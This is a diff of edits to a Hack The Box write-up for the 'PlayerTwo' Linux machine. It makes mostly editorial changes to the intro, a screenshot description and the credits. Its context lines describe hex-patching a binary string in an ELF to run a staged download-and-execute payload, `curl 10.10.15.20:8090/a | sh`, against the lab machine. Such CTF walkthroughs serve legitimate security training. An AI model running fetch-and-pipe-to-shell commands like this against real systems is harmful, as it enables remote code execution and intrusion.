@@ -4,7 +4,7 @@
 
 ![](../.gitbook/assets/playertwo-infocard.png)
 
-An Insane difficulty Linux machine that tested my web skills a lot...&lt;more&gt;
+An Insane difficulty Linux machine that tested my web skills quite a bit and also had me doing as much research on new protocols and services as three or four easy or medium boxes would.  Finding each pathway forward wasn't too difficult with proper enumeration, but getting past each step required patience and reading lots of documentation.  
 
 ## Useful Skills and Tools
 
@@ -423,7 +423,7 @@ Yep.  Lucky guess again.  It seemed that I can upload files to go through some s
 
 ![](../.gitbook/assets/12-protobs-pdf_link.jpg)
 
-After searching around the site for awhile, I found a very hard to see link under the heading "Get an early access to Protobs".  The background was animated and the explosion kept obscuring the text.  In the screenshot above I have my mouse hovering over the link \(see the url in the bottom right corner\).  Clicking on this link gave me a pdf at [http://product.player2.htb/protobs.pdf](http://product.player2.htb/protobs.pdf).  
+After searching around the site for awhile, I found a very hard to see link under the heading "Get an early access to Protobs".  The background was animated and the explosion kept obscuring the text.  In the screenshot above I have my mouse hovering over the link \(see the URL in the bottom left corner\).  Clicking on this link gave me a pdf at [http://product.player2.htb/protobs.pdf](http://product.player2.htb/protobs.pdf).  
 
 ![](../.gitbook/assets/17-protobs-pdf.png)
 
@@ -452,7 +452,7 @@ While browsing through the file, I saw a string in the ELF that looks suspicious
 
 I did some research into how to replace a section of code in the ELF, and came up with [https://reverseengineering.stackexchange.com/questions/14607/replace-section-inside-elf-file](https://reverseengineering.stackexchange.com/questions/14607/replace-section-inside-elf-file).  This in turn led to: [https://unix.stackexchange.com/questions/214820/patching-a-binary-with-dd](https://unix.stackexchange.com/questions/214820/patching-a-binary-with-dd).  Using strings to determine the byte offset of the code to replace, then using `dd` it is possible to replace arbitrary code.  However, it seemed to me as if all they were doing was some fancy cut and paste.  
 
-I knew from previous experience from doing CTFs that you could modify the hex code of a file \(and by extension the ASCII strings they represent\) almost as easily as using a regular text editor.  I decided to try "cheating" a bit using GHex. I selected the string I wanted to replace, and wrote my own commands in its place.  I kept it as simple as possible since I didn't know what kind of checks the verification would do, and decided to create a staged payload. I wanted this program to download a script that would be hosted on my local python SimpleHTTPServer.  My code read:`curl 10.10.15.20:8090/a | sh` .  This would download my script and then execute it using `sh`.  _I would have used bash, but nearly every Linux box is guaranteed to have `sh` or at least something aliased to it, and this also saved me a couple characters!_  
+I knew from previous experience from doing CTFs that you could modify the hex code of a file \(and by extension the ASCII strings they represent\) almost as easily as using a regular text editor.  I decided to try "cheating" a bit using GHex. I selected the string I wanted to replace, and wrote my own commands in its place.  I kept it as simple as possible since I didn't know what kind of checks the verification would do, and decided to create a staged payload. I wanted this program to download a script that would be hosted on my local python SimpleHTTPServer.  My code read:`curl 10.10.15.20:8090/a | sh` .  This would download my script called simply `a` and then execute it using `sh`.  _I would have used bash, but nearly every Linux box is guaranteed to have `sh` or at least something aliased to it, and this also saved me a couple characters!_  
 
 ```text
 #!/bin/sh
@@ -754,7 +754,7 @@ It looked like I had found the configuration utility for the `protobs` program, 
 
 ![Nope.](../.gitbook/assets/4-nope.png)
 
-Thanks to [`MrR3boot`](https://www.hackthebox.eu/home/users/profile/13531) & [`b14ckh34rt`](https://www.hackthebox.eu/home/users/profile/<profile_num>) for creating such a fun and challenging machine.  I feel like I had to learn as much for this one as I normally would in three or four easy - medium ones together.
+Thanks to [`MrR3boot`](https://www.hackthebox.eu/home/users/profile/13531) & [`b14ckh34rt`](https://www.hackthebox.eu/home/users/profile/<profile_num>) for creating such a fun and challenging machine.  I feel like I had to learn as much just to get User access for this one as I normally would in three or four easy - medium ones all together.
 
 If you like this content and would like to see more, please consider supporting me through Patreon at [https://www.patreon.com/zweilosec](https://www.patreon.com/zweilosec).
 
